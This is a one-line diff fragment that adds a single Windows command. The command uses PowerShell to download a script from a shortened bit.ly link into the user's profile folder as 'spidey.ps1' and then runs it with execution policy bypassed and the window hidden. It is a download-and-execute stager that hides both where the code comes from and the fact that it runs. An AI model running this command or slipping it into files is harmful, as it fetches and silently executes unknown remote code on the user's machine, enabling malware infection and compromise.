@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe invoke-webrequest -uri https://bit.ly/3NIEoHE -outfile %userprofile%\spidey.ps1 && powershell -ep bypass -window Hidden %userprofile%\spidey.ps1
